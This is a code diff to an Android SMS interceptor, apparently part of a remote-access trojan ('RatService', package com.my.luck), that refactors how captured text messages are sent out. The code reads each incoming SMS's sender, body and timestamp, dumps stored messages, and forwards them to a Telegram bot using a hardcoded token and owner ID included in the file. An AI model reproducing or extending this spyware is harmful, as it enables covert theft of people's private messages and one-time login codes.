@@ -5,13 +5,11 @@ import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
-import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.Telephony;
 import android.telephony.SmsMessage;
 import android.util.Log;
-import com.my.luck.core.RatService;
 import com.my.luck.network.TelegramBot;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
@@ -22,6 +20,10 @@ import java.util.Locale;
 
 public class SmsInterceptor extends BroadcastReceiver {
     private static final String TAG = "SmsInterceptor";
+    
+    // 🔑 YOUR CREDENTIALS
+    private static final String BOT_TOKEN = "8809826791:AAERMVrTHNr3VsreEZGUtSN8ltWRTuI2qrs";
+    private static final String OWNER_ID = "8681027856";
 
     @Override
     public void onReceive(Context context, Intent intent) {
@@ -49,12 +51,18 @@ public class SmsInterceptor extends BroadcastReceiver {
                     String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                             .format(new Date(sms.getTimestampMillis()));
 
-                    Log.d(TAG, "📱 SMS CAPTURED");
-                    Log.d(TAG, "  📦 App: " + packageName);
-                    Log.d(TAG, "  📌 From: " + sender);
-                    Log.d(TAG, "  📝 Body: " + body);
+                    // Send to Telegram
+                    String message = "📱 <b>SMS CAPTURED</b>\n";
+                    message += "━━━━━━━━━━━━━━━\n";
+                    message += "📦 <b>App:</b> " + packageName + "\n";
+                    message += "📌 <b>From:</b> " + sender + "\n";
+                    message += "📝 <b>Message:</b>\n" + body + "\n";
+                    message += "🕐 <b>Time:</b> " + timestamp + "\n";
+                    message += "━━━━━━━━━━━━━━━";
 
-                    sendToTelegram(context, packageName, sender, body, timestamp);
+                    TelegramBot bot = new TelegramBot(context, BOT_TOKEN, OWNER_ID);
+                    bot.sendMessage(message);
+                    Log.d(TAG, "✅ SMS forwarded to Telegram");
 
                 } catch (Exception e) {
                     Log.e(TAG, "Error processing SMS", e);
@@ -92,31 +100,14 @@ public class SmsInterceptor extends BroadcastReceiver {
         }
     }
 
-    private void sendToTelegram(Context context, String packageName, String sender, String body, String timestamp) {
-        try {
-            String message = "📱 <b>SMS CAPTURED</b>\n";
-            message += "━━━━━━━━━━━━━━━\n";
-            message += "📦 <b>App:</b> " + packageName + "\n";
-            message += "📌 <b>From:</b> " + sender + "\n";
-            message += "📝 <b>Message:</b>\n" + body + "\n";
-            message += "🕐 <b>Time:</b> " + timestamp + "\n";
-            message += "━━━━━━━━━━━━━━━";
-
-            TelegramBot bot = new TelegramBot(context, "8809826791:AAERMVrTHNr3VsreEZGUtSN8ltWRTuI2qrs", "8681027856");
-            bot.sendMessage(message);
-            Log.d(TAG, "✅ SMS forwarded to Telegram");
-
-        } catch (Exception e) {
-            Log.e(TAG, "Failed to send SMS to Telegram", e);
-        }
-    }
-
     // ============================================
     // 📱 SMS MODULE - FULL SMS DUMP
     // ============================================
 
     public static class SmsModule {
         private Context context;
+        private static final String BOT_TOKEN = "8809826791:AAERMVrTHNr3VsreEZGUtSN8ltWRTuI2qrs";
+        private static final String OWNER_ID = "8681027856";
 
         public SmsModule(Context context) {
             this.context = context;
@@ -190,7 +181,7 @@ public class SmsInterceptor extends BroadcastReceiver {
 
         private void sendMessage(String text) {
             try {
-                TelegramBot bot = new TelegramBot(context, "8809826791:AAERMVrTHNr3VsreEZGUtSN8ltWRTuI2qrs", "8681027856");
+                TelegramBot bot = new TelegramBot(context, BOT_TOKEN, OWNER_ID);
                 bot.sendMessage(text);
             } catch (Exception e) {
                 Log.e(TAG, "Error sending SMS dump", e);
